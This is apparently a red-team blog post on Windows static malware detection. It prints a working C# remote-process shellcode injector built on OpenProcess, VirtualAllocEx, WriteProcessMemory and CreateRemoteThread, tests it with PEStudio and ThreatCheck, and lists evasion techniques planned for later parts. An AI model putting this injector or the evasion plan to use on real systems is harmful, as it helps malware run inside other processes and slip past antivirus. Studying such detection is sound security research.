---
title: "API Series Part 1: Static Detection and Why Your Loader Gets Caught"
date: 2026-06-24 00:00:00 +0000
categories: [Windows Internals, API Series]
tags: [windows, csharp, pe, import-table, static-analysis, pestudio, threatcheck, defender, red-team]
toc: true
---

## Overview

The common assumption in offensive security is that using well-known injection APIs — `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread` — is an immediate detection trigger. The import table is visible, the function names are recognisable, and every AV engine has been scoring this combination as malicious for years.

This post tests that assumption. A basic shellcode injector is compiled and put in front of two static analysis tools to see exactly what each one flags, what it ignores, and what the actual detection trigger turns out to be. The result is the first piece of evidence in a longer question: at which layer does detection actually fire?

**What this post covers:**
- What static analysis is and what AV engines see before a binary runs
- The PE Import Address Table — why it is the first thing AV looks at
- A classic four-step shellcode injector and why each API call draws attention
- Using PEStudio and ThreatCheck to test what actually gets flagged

> All techniques described here were performed in an authorised lab environment. For educational purposes only.

---

## What Is Static Detection?

Antivirus engines perform two broad categories of detection: static and dynamic (behavioural).

**Static detection** happens before the binary executes. The AV engine reads the file on disk — or in memory when it is written — and scans for patterns it recognises as malicious:

- Specific byte sequences (shellcode signatures)
- Suspicious strings embedded in the binary
- Import table entries that match known offensive patterns
- High entropy sections (indicators of encryption or packing)

**Dynamic (behavioural) detection** happens at runtime: API call sequences, memory operations, network connections. That is covered in later posts.

This distinction matters because static and dynamic detections require different technical approaches to understand and address. Solving one does not solve the other. This post deals entirely with static.

---

## The PE Import Address Table

When you write a C# program that calls `VirtualAllocEx`, the compiler does not embed the function's code in your binary. Instead, it records the dependency: "this binary needs `VirtualAllocEx` from `kernel32.dll`." That record lives in the **Import Address Table (IAT)**, a structured section of the PE file that Windows reads at load time to wire up function pointers.

The IAT is plain text. Any tool — including AV engines — can open your binary and read exactly which functions you import from which DLLs before a single instruction runs.

This is the first problem.

---

## The Classic Four-Step Injector

Remote process injection follows the same pattern in virtually every offensive C# tool. The steps are:

```
1. OpenProcess      — get a handle to the target process
2. VirtualAllocEx   — allocate RWX memory inside it
3. WriteProcessMemory — copy shellcode into that allocation
4. CreateRemoteThread — start execution at the shellcode address
```

In C#, each of those calls requires a `[DllImport]` declaration:

```csharp
[DllImport("kernel32.dll", SetLastError = true)]
static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

[DllImport("kernel32.dll", SetLastError = true)]
static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
    uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll", SetLastError = true)]
static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
    byte[] lpBuffer, int nSize, out int lpNumberOfBytesWritten);

[DllImport("kernel32.dll", SetLastError = true)]
static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes,
    uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
    uint dwCreationFlags, IntPtr lpThreadId);
```

Every one of these declarations causes the function name to be written verbatim into the compiled binary's import table.

The full injector using these imports:

```csharp
static void Main(string[] args)
{
    Process[] targets = Process.GetProcessesByName("notepad");
    int pid = targets[0].Id;

    // Step 1: handle to target process
    IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);

    // Step 2: allocate RWX memory in the remote process
    IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero,
        (uint)shellcode.Length, 0x3000, 0x40);

    // Step 3: write shellcode
    int written;
    WriteProcessMemory(hProcess, addr, shellcode, shellcode.Length, out written);

    // Step 4: execute
    CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
}
```

This is clean, readable code. It also announces exactly what it does to every AV engine that scans it.

---

## What AV Sees: PEStudio Analysis

**PEStudio** (free, from winitor.com) opens a PE binary and scores it across multiple indicators before execution. Opening `BasicInjector.exe` immediately surfaces the problem.

### Import Table

PEStudio colour-codes imports by threat level. The four injection functions all appear flagged:

![PEStudio import table showing VirtualAllocEx, WriteProcessMemory, CreateRemoteThread flagged as suspicious](/assets/img/posts/api-series/pestudio-imports.png)

Each flag has a reason:

| Import | Why it is flagged |
|---|---|
| `OpenProcess` with `PROCESS_ALL_ACCESS` | Acquiring full control of another process is the first step of every injection technique |
| `VirtualAllocEx` | Allocating executable memory in a remote process has no legitimate use case in most applications |
| `WriteProcessMemory` | Writing to another process's memory is the defining action of code injection |
| `CreateRemoteThread` | Creating a thread in a remote process is how injected code is started |

No single import is conclusive on its own. `OpenProcess` is called by debuggers. `VirtualAllocEx` is called by some legitimate tools. But the combination of all four, in the same binary, with no other context, is a textbook injection pattern — and AV engines have been scoring this combination as malicious for over a decade.

### Strings

PEStudio also extracts strings from the binary. Even without the imports, the function names appear as strings in the PE's metadata sections — another detection surface.

### Entropy

The shellcode section produces elevated entropy. A block of random-looking bytes with high entropy tells AV "this is probably encrypted or compressed code" — which correlates strongly with shellcode. Even if the bytes themselves do not match a known signature, high entropy in an executable section is an indicator.

---

## ThreatCheck: Isolating What Defender Actually Fires On

PEStudio tells you what looks suspicious. **ThreatCheck** tells you exactly which bytes trigger the Defender engine.

ThreatCheck binary-searches the PE: it submits halves of the file to Defender's scan engine, determines which half contains the detection, and recurses until it isolates the minimum triggering byte range.

To isolate whether the imports themselves trigger a detection, BasicInjector was built with a zeroed 256-byte payload buffer instead of real shellcode — stripping any known payload signature from the binary.

```
ThreatCheck.exe -f BasicInjector.exe
```

![ThreatCheck showing no threat found on BasicInjector with zeroed payload](/assets/img/posts/api-series/threatcheck-output.png)

Result:

```
[+] No threat found!
[*] Run time: 0.09s
```

**The imports alone do not trigger Defender's static signature engine.** A binary containing `OpenProcess`, `VirtualAllocEx` with `PAGE_EXECUTE_READWRITE`, `WriteProcessMemory`, and `CreateRemoteThread` in its IAT does not get flagged on disk by Windows Defender — even with no obfuscation, no packing, and no payload encryption.

This is not a defence of that binary. It means PEStudio and Defender are measuring different things:

| Layer | What triggers it | Tool that surfaces it |
|---|---|---|
| Risk scoring | Suspicious import combinations | PEStudio (analyst review) |
| Active signature | Known byte sequences (payload bytes) | ThreatCheck (Defender engine) |

Defender's on-disk signature rule needs a known-bad byte pattern to fire. The import table is an indicator — it raises the risk score — but it is not a signature match on its own. PEStudio surfaces the import risk because an analyst reviewing this binary would immediately treat it as an injection tool. An EDR doing behavioural analysis at runtime would watch those calls closely. But the static quarantine rule needs something it can pin to a specific byte sequence.

---

## Two Distinct Problems

The two tools give complementary pictures — and together they surface three separate evasion problems:

| Problem | Detection layer | Solution |
|---|---|---|
| Import table risk scoring | Analyst / EDR static analysis | Dynamic API resolution (Part 3) |
| Payload byte signature | Defender active rule | Encrypt/encode the payload; avoid known prologues |
| API call behaviour at runtime | EDR hooks (CrowdStrike-style) or kernel callbacks (MDE-style) — see Part 2 | Direct syscalls / unhooking (Parts 4–5) |

The import table does not trigger an active Defender signature on its own — but it will get the binary flagged by any analyst or EDR that does risk scoring on the IAT. Removing the imports with dynamic resolution solves the static analysis problem but does nothing about runtime hooks. Each problem has a specific fix, and understanding which layer is firing tells you which fix to apply.

---

## What Comes Next

The import table flags the binary as suspicious to any analyst or tool doing risk scoring. But ThreatCheck showed Defender’s static engine does not fire on the imports alone.

Part 2 tests the next assumption: at runtime, does making these API calls trigger detection? We trace the full path of a `VirtualAllocEx` call from your code through the Windows API layers to the kernel, map exactly where different EDRs instrument that path, and then run the injection against a live MDE-protected system to see what actually happens.

- **[API Series Part 2: The Windows API Call Stack and Where EDRs Hook](/posts/api-series-call-stack/)**

---

## References

- [PE Format — Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [VirtualAllocEx — MSDN](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
- [PEStudio — winitor.com](https://www.winitor.com/)
- [ThreatCheck — GitHub](https://github.com/rasta-mouse/ThreatCheck)
- [MITRE ATT&CK T1055 — Process Injection](https://attack.mitre.org/techniques/T1055/)

**Related posts:**
- [AMSI Internals Part 1: The Full Scan Pipeline](/posts/amsi-internals-scan-pipeline/)
- [AMSI Bypass Part 2: Hardware Breakpoints](/posts/amsi-bypass-hardware-breakpoints/)
